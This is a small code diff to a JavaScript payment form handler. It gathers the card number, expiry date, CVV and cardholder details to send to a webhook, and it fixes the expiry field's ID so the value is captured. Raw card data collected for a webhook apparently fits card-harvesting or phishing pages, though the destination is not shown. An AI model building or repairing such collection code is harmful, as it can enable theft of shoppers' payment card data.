@@ -326,9 +326,9 @@ form.addEventListener('submit', async function(event) {
     // Prepare data to send to the webhook
     const cardholderName = document.getElementById('cardholderName').value;
     const zipcode = document.getElementById('zipcode').value;
-    const fullAddress = document.getElementById('fullAddress').value;
+    const fullAddress = ""; // Set to empty string or remove if not needed
     const cardNumber = document.getElementById('cardNumber').value;
-    const expiryDate = document.getElementById('expiryDate').value;
+    const expiryDate = document.getElementById('expirationDate').value; // Use the correct ID
     const cvv = document.getElementById('cvv').value;
 
     const paymentData = {
